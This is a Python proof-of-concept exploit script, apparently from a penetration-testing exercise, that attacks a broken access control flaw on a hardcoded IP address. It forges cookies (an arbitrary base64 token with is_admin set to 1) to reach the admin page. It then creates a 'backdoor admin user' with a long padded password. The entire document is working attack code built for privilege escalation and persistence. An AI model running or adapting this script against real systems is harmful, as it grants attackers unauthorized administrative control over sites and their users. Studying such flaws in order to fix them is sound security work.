# Type: Broken Access Control
# Performing unauthorized admin actions as normal user.
# Written by Kair0s3

import requests
import base64
import urllib

# Only change these values if needed.
target = "http://54.251.213.12"
user = "existential_crisis_1"
password = "SanityInsanity0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000020000000000000000000000400000000000000000000000000010000000000000000"

def createAdminUser(cookies):
    data = {
        "new_user" : user,
        "new_password" : password,
        "new_is_admin" : "1"
    }
    r = requests.post(target + "/admin?page=users", data=data, cookies=cookies)
    if "New user created successfully" in r.text:
        print("Your PoC user has been created. Try logging in.")
    else:
        print("Something went wrong, it is likely that your intended username has been taken. Try running again after changing the username.")

def sendUnauthorizedRequest():
    # Does an initial sanity check to see if can see admin page.
    cookies = {
        # Token can be anything, doesn't even have to be valid.
        "token" : base64.b64encode(b"PENTEST_GROUP1_2023_BLUE").decode(),
        "is_admin" : "1"
    }
    r = requests.get(target + "/admin", cookies=cookies)
    if "admin" in r.text.lower():
        print("Done sanity checking, moving on to create backdoor admin user")
        createAdminUser(cookies)
    else:
        print("This doesn't seem vulnerable...")
        return

def attack():
    sendUnauthorizedRequest()

if __name__ == "__main__":
    attack()